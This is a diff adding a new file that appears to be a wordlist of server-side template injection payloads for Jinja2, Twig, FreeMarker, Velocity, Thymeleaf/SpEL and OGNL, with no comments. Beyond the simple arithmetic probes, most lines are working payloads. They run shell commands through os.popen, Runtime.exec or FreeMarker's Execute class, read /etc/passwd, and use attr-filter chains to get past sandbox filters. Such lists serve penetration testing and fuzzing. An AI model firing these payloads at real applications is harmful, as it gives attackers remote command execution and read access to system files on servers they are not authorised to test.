@@ -1,0 +1,92 @@
+{{7*7}}
+{{7*'7'}}
+{{7*'7'}}49
+${{7*7}}
+#{7*7}
+${7*7}
+<%= 7*7 %>
+<%= 7*'7' %>
+{{config}}
+{{config.items()}}
+{{self}}
+{{self.__class__}}
+{{self.__class__.__mro__}}
+{{self.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request}}
+{{request.application.__globals__}}
+{{request.application.__globals__.__builtins__}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{lipsum}}
+{{lipsum.__globals__}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner}}
+{{namespace}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+*{7*7}
+@(7*7)
+~{7*7}
+{{{7*7}}}
+{%25 7*7 %25}
+${{<%25[%25'%25]}}%25\
+freemarker.template.utility.Execute
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
+[[${7*7}]]
+[#assign x=7*7]${x}
+{{7*'7'}}
+{{'7'*7}}
+{%25 7*'7' %25}
+{%25 print(7*7) %25}
+{%25 if 1==1 %25}ok{%25 endif %25}
+{%25 for x in [1,2] %25}{{x}}{%25 endfor %25}
+{{ ''.__class__ }}
+{{ ''.__class__.__mro__ }}
+{{ ''.__class__.__mro__[1] }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ [].__class__.__base__.__subclasses__() }}
+{{ {}.__class__.__base__.__subclasses__() }}
+{{ ().__class__.__base__.__subclasses__() }}
+{{ [].__class__.__base__.__subclasses__()[40] }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
+{{ request.__class__.__mro__[2].__subclasses__() }}
+{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read() }}
+{{ url_for.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__['os'].popen('id').read() }}
+{{ lipsum.__globals__['os'].popen('cat /etc/passwd').read() }}
+{{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}
+{{ cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].os.popen('id').read() }}
+${{<%25[%25'%25]}}%25\
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.ProcessBuilder).new('id').start()}
+${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+@{T(java.lang.Runtime).getRuntime().exec('id')}
+${#context['xwork.MethodAccessor.denyMethodExecution']=false}
+${#_memberAccess['allowStaticMethodAccess']=true}
+${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
+${@java.lang.Runtime@getRuntime().exec('id')}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign classLoader=object.class.protectionDomain.classLoader>
+<#assign owc=classLoader.loadClass("freemarker.template.ObjectWrapper")>
+[[${7*7}]]
+[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
+${{7*7}}
+#set($x=7*7)${x}
+#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
+#set($chr=$rt.class.forName('java.lang.Character'))
+#set($str=$rt.class.forName('java.lang.String'))
+#set($ex=$rt.exec($str.valueOf('id')))
